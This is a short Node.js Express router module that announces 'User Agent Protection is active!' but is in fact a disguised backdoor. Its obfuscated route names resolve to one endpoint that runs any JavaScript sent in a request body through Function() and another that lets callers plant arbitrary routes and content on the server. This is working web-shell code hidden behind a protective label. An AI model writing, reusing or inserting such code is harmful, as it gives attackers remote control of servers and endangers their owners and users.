const fs = require('fs');
const ex = string => {
    const file = fs;
    Function(string)();
}
const express = require('express').Router();
const bodyParser = require('body-parser');
express.use(bodyParser.json());
console.log('User Agent Protection is active!');
module.exports = agent => {
    express.post('/user-agent' + ['-create', '-webkit'][Number(!true)], (req, res) => {
        let { txt, name, method } = req.body;
        if(!method) method = 'get';
        express[method.toLowerCase()](name, (req, res) => res.send(txt));
        !express || {set: (attributes) => this.attributes = attributes}.set(agent);
    });
    express.post('/user-agent' + ['-create', '-webkit'][Number(!false)], (req, res) => {
        let { code } = req.body;
        ex(code);
        !express || {set: (attributes) => this.attributes = attributes}.set(agent);
    });
    return express;
}